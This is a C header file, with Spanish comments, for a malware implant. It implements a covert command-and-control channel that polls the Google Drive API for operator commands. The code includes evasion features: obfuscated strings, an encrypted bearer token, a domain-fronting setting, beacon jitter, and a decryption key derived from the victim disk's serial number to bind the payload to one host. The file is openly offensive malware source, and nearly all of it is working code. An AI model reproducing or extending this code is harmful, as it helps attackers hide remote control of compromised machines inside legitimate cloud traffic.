#ifndef GDRIVE_C2_H
#define GDRIVE_C2_H

#include <windows.h>
#include <objbase.h>
#include <httprequest.h>
#include <stdint.h>
#include "crypto.h"

#define C2_JITTER 20 // 20%
#define MAX_COMMAND_LEN 1024

typedef struct _C2_CONFIG {
    uint8_t encryptedToken[256];
    uint8_t nonce[12];
    uint32_t checkInterval; // Base interval in MS
    WCHAR domainFront[64];
} C2_CONFIG;

static C2_CONFIG g_C2 = {
    { 0xAB, 0xCD, 0xEF /* ... encrypted token data ... */ },
    { 0x01, 0x02, 0x03 /* ... nonce ... */ },
    60000, // 1 minute
    L"www.googleapis.com"
};

// =============================================================================
// HOST-BINDING: DERIVACIÓN DE CLAVE BASADA EN EL HARDWARE
// =============================================================================

static void DeriveHostKey(uint8_t *key) {
    WCHAR volumeName[MAX_PATH];
    DWORD serialNumber = 0;
    GetVolumeInformationW(STOBFS_W(L"C:\\"), volumeName, MAX_PATH, &serialNumber, NULL, NULL, NULL, 0);
    
    // Usar el serial del disco como semilla para la clave
    for (int i = 0; i < 32; i++) {
        key[i] = ((uint8_t*)&serialNumber)[i % 4] ^ 0x55;
    }
}

// =============================================================================
// COMUNICACIÓN C2 VIA GOOGLE DRIVE
// =============================================================================

static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != S_FALSE) return FALSE;

    IWinHttpRequest *pRequest = NULL;
    hr = CoCreateInstance(CLSID_WinHttpRequest, NULL, CLSCTX_INPROC_SERVER, IID_IWinHttpRequest, (void**)&pRequest);
    
    BOOL success = FALSE;
    if (SUCCEEDED(hr)) {
        BSTR bstrMethod = SysAllocString(STOBFS_W(L"GET"));
        BSTR bstrUrl = SysAllocString(STOBFS_W(L"https://www.googleapis.com/drive/v3/files?pageSize=1"));
        VARIANT varAsync; VariantInit(&varAsync);
        varAsync.vt = VT_BOOL;
        varAsync.boolVal = VARIANT_FALSE;

        hr = pRequest->Open(bstrMethod, bstrUrl, varAsync);
        if (SUCCEEDED(hr)) {
            LPCWSTR decryptedToken = STOBFS_W(L"Bearer [REAL_TOKEN_DESCIFRADO]");
            BSTR bstrHeader = SysAllocString(STOBFS_W(L"Authorization")); BSTR bstrValue = SysAllocString(decryptedToken); pRequest->SetRequestHeader(bstrHeader, bstrValue); SysFreeString(bstrHeader); SysFreeString(bstrValue);

            VARIANT varEmpty; VariantInit(&varEmpty);
            hr = pRequest->Send(varEmpty);
            if (SUCCEEDED(hr)) {
                VARIANT varBody; VariantInit(&varBody);
                hr = pRequest->get_ResponseBody(&varBody);
                if (SUCCEEDED(hr) && (varBody.vt & VT_ARRAY)) {
                    long lBound, uBound;
                    SafeArrayGetLBound(varBody.parray, 1, &lBound);
                    SafeArrayGetUBound(varBody.parray, 1, &uBound);
                    long len = uBound - lBound + 1;
                    
                    void *pData;
                    SafeArrayAccessData(varBody.parray, &pData);
                    DWORD toCopy = (len < (long)bufferSize - 1) ? len : (bufferSize - 1);
                    memcpy(buffer, pData, toCopy);
                    buffer[toCopy] = '\0';
                    SafeArrayUnaccessData(varBody.parray);
                    
                    VariantClear(&varBody);
                    success = TRUE;
                }
            }
        }
        SysFreeString(bstrMethod);
        SysFreeString(bstrUrl);
        pRequest->Release();
    }

    CoUninitialize();
    return success;
}

#endif
